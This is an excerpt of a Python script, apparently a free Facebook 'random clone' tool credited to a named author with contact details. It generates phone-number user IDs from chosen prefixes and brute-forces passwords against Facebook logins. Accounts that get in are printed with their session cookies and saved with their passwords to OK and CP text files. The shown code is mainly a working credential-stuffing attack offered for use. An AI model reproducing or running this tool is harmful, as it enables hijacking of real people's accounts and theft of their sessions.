...
==================================================
[тАв] AUTHOR    : SAWON ISLAM 
[тАв] TOOLS     : RANDOM CLONE
[тАв] TYPE      : FREE
[тАв] FACEBOOK  : SAWON ISLAM
[тАв] WHATSAPP  : +8801945083441
==================================================""")
...
def fuck():
    ...
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE CODE: 017, 018, 019, 016, 014')
    code = input('[?] CHOOSE CODE : ')
    os.system('clear')
    print(logo)
    print('[+] EXAMPLE: 2000 3000 5000 10000 20000')
    ...
    print(' [+] OK Ids saved in SWN/OK.txt')
    print(' [+] CP Ids saved in SWN/CP.txt')
    print(mumitx)
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[SWN]├Ч[%s/%s]├Ч[OK-%s]├Ч[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
...
"scheme": 'https',
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[SWN-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/SWN/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[SWN-CP] {cid}|{ps}")
                open('/sdcard/SWN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
